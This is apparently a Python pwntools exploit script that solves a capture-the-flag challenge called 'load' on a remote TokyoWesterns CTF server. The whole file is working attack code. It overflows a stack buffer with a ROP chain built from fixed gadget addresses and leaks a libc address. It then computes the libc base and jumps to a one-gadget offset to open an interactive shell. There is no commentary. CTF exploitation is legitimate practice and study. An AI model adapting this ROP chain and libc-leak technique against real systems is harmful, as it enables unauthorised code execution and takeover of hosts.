from pwn import *


#r = process(["./load"])

r = remote("pwn1.chal.ctf.westerns.tokyo",34835)

context.arch = "amd64"


r.sendlineafter(":","/dev/stdin".ljust(0x10,"\x00")+"/dev/pts/0\x00".ljust(0x10,"\x00")+"ls\x00")
r.sendlineafter(":","0")
r.sendlineafter(":",str(0x1000))

#input(":")

payload = "a"*0x38+flat(
0x400a6a,0x0,0x1,0x600ff0,0x0,0x2702,0x601050,0x400a50,0x0,
0x0,0x1,0x600ff0,0x0,0x2702,0x601050,0x400a50,0x0,
0x0,0x1,0x600ff0,0x0,0x2702,0x601050,0x400a50,0x0,
0x0,0x1,0x600fa0,0x0,0x0,0x600fa0,0x400a50,0x0,
0x0,0x1,0x600fc8,0x100,0x601d00,0x0,0x400a50,0x0,
0x0,0x601d00-0x8,0x600fa0,0x0,0x0,0x601060,0x4009d9,
)

r.sendline(payload)
r.recvline()

libc = u64(r.recvline()[:-1]+"\x00"*2)-0x6f690
print hex(libc)

payload = flat(libc+0xf1147)
r.send(payload)
r.interactive()

